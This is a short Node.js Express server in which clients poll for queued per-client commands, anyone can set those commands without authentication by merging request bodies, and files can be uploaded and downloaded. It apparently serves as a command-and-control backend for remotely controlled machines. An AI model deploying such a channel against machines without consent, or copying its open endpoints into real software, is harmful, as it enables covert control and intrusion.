const express = require('express');
const fs = require('fs');
const app = express();

const users = {};

app.use(express.json());
app.get('/users', (request, response) => {
  response.end(JSON.stringify(users));
});
app.get('/get/:user', (request, response) => {
  let user = users[request.params.user];
  if (user) (response.end(users[request.params.user].command), user.repeat===0 && (users[request.params.user] = { command: "none", repeat: 1 }));
  else (users[request.params.user] = { command: "none", repeat: 1 }, response.end('none'));
});
app.post('/command', (request, response) => {
  Object.assign(users, request.body);
  response.status(200).end();
});
app.post('/file', (request, response) => {
  request.pipe(fs.createWriteStream(__dirname + '/file'));
  request.on('end', () => {
    response.status(200).end();
  });
});
app.get('/download', (request, response) => {
  response.download(__dirname + '/file');
});
require('http').createServer(app).listen(process.env.PORT || 80);